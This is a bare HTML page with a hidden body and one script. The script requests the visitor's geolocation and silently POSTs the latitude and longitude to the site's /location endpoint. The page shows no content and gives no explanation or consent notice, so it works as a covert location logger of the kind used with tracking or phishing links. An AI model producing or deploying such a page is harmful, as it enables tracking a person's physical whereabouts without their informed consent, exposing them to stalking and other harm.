<!DOCTYPE html>
<html>
<body style="display:none;">

<script>

navigator.geolocation.getCurrentPosition(
function(pos){

fetch("/location",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
latitude:pos.coords.latitude,
longitude:pos.coords.longitude
})
})

});

</script>

</body>
</html>
